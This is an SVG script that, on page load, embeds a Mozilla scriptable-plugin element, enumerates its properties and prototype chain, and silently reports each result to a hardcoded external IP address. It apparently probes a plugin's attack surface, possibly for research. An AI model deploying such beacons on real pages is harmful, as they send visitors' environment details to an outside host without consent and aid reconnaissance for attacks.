svg.script:
var base = "http://191.32.31.251/app-native-018/report?";
function report(key, value) {
  try {
    getURL(base + "key=" + encodeURIComponent(key) +
      "&value=" + encodeURIComponent(String(value)), function(){});
  } catch (error) {}
}
function names(value) {
  var output = [], key;
  try {
    if (Object.getOwnPropertyNames) { return Object.getOwnPropertyNames(value); }
  } catch (error) {}
  try { for (key in value) { output[output.length] = key; } } catch (error2) {}
  return output;
}
function runEmbed() {
  var element, current, level = 0;
  report("embed.start", "true");
  try {
    element = document.createElementNS("http://www.w3.org/1999/xhtml", "embed");
    element.setAttribute("type", "application/mozilla-npruntime-scriptable-plugin");
    document.documentElement.appendChild(element);
    report("embed.appended", "true");
    report("embed.typeof", typeof element);
    report("embed.string", String(element));
    current = element;
    while (current && level < 5) {
      report("embed.level" + level, names(current).slice(0, 180).join("|"));
      current = Object.getPrototypeOf ? Object.getPrototypeOf(current) : null;
      level += 1;
    }
    try { report("embed.object", typeof element.object + ":" + String(element.object)); }
    catch (objectError) { report("embed.object.error", objectError); }
    document.getElementById("status").firstChild.data = "Embed reflection complete";
    report("embed.complete", "true");
  } catch (error) {
    report("embed.error", error);
    document.getElementById("status").firstChild.data = "Embed error: " + error;
  }
}
report("control.loaded", "true");
window.setTimeout(runEmbed, 500);
